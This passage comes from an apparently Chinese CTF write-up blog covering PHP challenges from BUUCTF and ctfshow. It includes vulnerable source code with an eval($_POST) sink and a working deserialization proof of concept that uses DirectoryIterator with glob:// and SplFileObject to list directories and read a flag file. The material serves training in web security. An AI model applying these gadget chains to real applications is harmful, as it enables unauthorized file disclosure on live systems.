class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  一眼可以看出这里用了一堆正则表达式来过滤我们提交的数据，而且第三个正则表达式和前面两个不一样，这里判断了nickname是否为字符还有长度是否超过10。用文章开头的知识点二，如果我们传入的nickname是一个数组，绕过长度的限制，则可以绕过这正则表达式，是我们不会die出。<br>  在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。<br>  我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p><p><strong>update_profile()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>filter()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>update()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p><p><strong>看wp吧  这里就不太想写了 </strong>      </p><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">wp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf 第二页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-愚人杯</title>
      <link href="/posts/28e06bac.html"/>
      <url>/posts/28e06bac.html</url>
      
        <content type="html"><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>题目</p><p><img src="../images/image-20230404104706716.png" alt="image-20230404104706716"></p><p>一个表情包，然后url后面还跟着一段base64编码的内容，解码后查看时<strong>face.png</strong>，所以感觉这里存在<strong>文件包含或者文件查询</strong></p><p>然后就去查询<code>index.php</code>,然后就查看源码发现了一段base64编码的内容，然后拿去解码</p><p><strong>解码后的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;ctfshow&#123;3ae89687-0319-4fdd-8d58-4910ede71b51&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:/?img=&quot;</span>.<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure><p>这题考察的就是原生类的做法</p><p><strong>实现了serializable接口的内置类就是c开头的</strong></p><p><a href="https://blog.csdn.net/JSPSEO/article/details/125135112">深入了解PHP反序列化原生类</a></p><p><a href="https://blog.csdn.net/weixin_61956136/article/details/125705264">web安全-PHP反序列化漏洞</a></p><p><img src="../images/image-20230404113117742.png" alt="image-20230404113117742"></p><p>本题就是用这个内置类来解题的</p><p>首先我们看到最下面这里是$ip = $SERVER[“HTTP_AAAAAA”]; 这一句话的意思是接收header头中 aaaaaa参数的值，然后将其反序列化。 然后根据提示在根目录中有一个txt文件，但是这里我们不知道他的文件名字是什么。</p><p><img src="../images/image-20230404114042321.png" alt="image-20230404114042321"></p><p><strong>这里传aaaaa是因为这个玩意对大小写不敏感，本地测试过了</strong></p><p><img src="../images/image-20230404115608848.png" alt="image-20230404115608848"></p><p>这里的格式就是和上面的内置类是一样的，并且<strong>coos</strong>和<strong>file</strong>还可控所以这里就可以直接查上面给的<strong>txt</strong>文件</p><p><strong>非预期</strong></p><p><a href="https://blog.csdn.net/qq_46570234/article/details/129928356?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168059578216800227488263%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168059578216800227488263&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-129928356-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;spm=1018.2226.3001.4187">非预期wp</a></p><p>这里就是只用到了两个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是只用到两个类，就是一个类用获取文件名，一个用来获取flag的值</p><p>我们知道在php中支持使用<code>$a($b)</code>这样动态的形式调用函数/实例化，</p><p>可以看到我们这一行就是这样的形式：<code>$a = new $this-&gt;coos($this-&gt;file);</code></p><p><strong>可遍历目录类有以下几个：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator 类</span><br><span class="line">FilesystemIterator 类</span><br><span class="line">GlobIterator 类</span><br></pre></td></tr></table></figure><p><strong>可读取文件类有：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SplFileObject 类</span><br></pre></td></tr></table></figure><p>我们需要用内置类来遍历目录，然后读取文件</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="comment">// private $eeee=&quot;-_-&quot;;</span></span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"> <span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>分两步走，第一步，读取文件名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///*f*&quot;</span>; <span class="comment">#使用glob协来查找匹配的文件路径模式 这里/*f*匹配了根目录下包含f的文件夹名</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163706592.png" alt="image-20230404163706592"></p><p>读取到了文件名，然后我们就用另一个内置类来读取文件内容</p><p><strong>第二步，使用<code>SplFileObject</code>类读取文件内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404163852169.png" alt="image-20230404163852169"></p><p>最后拿到flag</p><h2 